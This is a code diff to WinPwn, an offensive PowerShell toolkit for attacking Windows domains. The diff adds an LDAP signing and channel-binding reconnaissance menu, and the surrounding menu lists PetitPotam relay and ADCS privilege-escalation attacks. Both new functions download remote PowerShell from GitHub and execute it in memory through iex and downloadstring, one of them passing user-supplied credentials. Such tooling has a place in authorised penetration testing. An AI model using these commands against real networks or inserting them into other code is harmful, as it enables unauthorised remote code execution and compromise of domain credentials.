@@ -2164,7 +2164,8 @@ __        ___       ____
         Write-Host -ForegroundColor Green '24. Search for vulnerable Domain Systems - RBCD via Petitpotam + LDAP relay!'
         Write-Host -ForegroundColor Green '25. Check the ADCS Templates for Privilege Escalation vulnerabilities via Certify!'
         Write-Host -ForegroundColor Green '26. Enumerate ADCS Template informations and permissions via Certify!'
-        Write-Host -ForegroundColor Green '27. Go back '
+        Write-Host -ForegroundColor Green '27. Check LDAP/LDAPS Signing and or Channel Binding'
+        Write-Host -ForegroundColor Green '28. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2197,9 +2198,88 @@ __        ___       ____
          24{Invoke-RBDC-over-DAVRPC}
          25{Invoke-VulnerableADCSTemplates}
          26{Invoke-ADCSTemplateRecon}
+         27{LDAPChecksMenu}
        }
     }
-  While ($masterquestion -ne 27)
+  While ($masterquestion -ne 28)
+}
+
+function LDAPChecksMenu
+{
+        do
+        {
+       @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> LDAP Checks
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green "1. @klezVirus's SharpLdapRelayScan (requires username/password)! "
+            Write-Host -ForegroundColor Green "2. @cube0x0's LdapSignCheck ! "
+            Write-Host -ForegroundColor Green '3. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{SharpLdapRelayScan}
+                2{LdapSignCheck}
+             }
+        }
+        While ($masterquestion -ne 3)
+
+
+}
+
+function SharpLdapRelayScan
+{
+# Credit to https://github.com/klezVirus/SharpLdapRelayScan
+
+    Param
+    (   
+        [Switch]
+        $consoleoutput,
+        [String]
+        $username,
+        [String]
+        $password
+    )
+    if(!$consoleoutput){pathcheck}
+
+    if([string]::IsNullOrEmpty($username))
+    {
+        $username = Read-Host -Prompt 'Please enter a valid username:'
+    }
+    if([string]::IsNullOrEmpty($password))
+    {
+        $password = Read-Host -Prompt 'Please enter a valid password:'
+    }
+
+    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpLdapRelayScan.ps1')
+    if(!$consoleoutput){Invoke-SharpLdapRelayScan -Command "-u $username -p $password" >> "$currentPath\DomainRecon\LDAPSigningInfos.txt"}else{Invoke-SharpLdapRelayScan -Command "-u $username -p $password"}
+
+
+}
+
+function LdapSignCheck
+{
+
+# Credit to https://github.com/cube0x0/LdapSignCheck
+
+    Param
+    (   
+        [Switch]
+        $consoleoutput
+    )
+    if(!$consoleoutput){pathcheck}
+
+    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-LdapSignCheck.ps1')
+    if(!$consoleoutput){Invoke-LdapSignCheck -command "" >> "$currentPath\DomainRecon\LDAPSigningInfos.txt"}else{Invoke-LdapSignCheck -command ""}
+
 }
 
 function Invoke-ADCSTemplateRecon
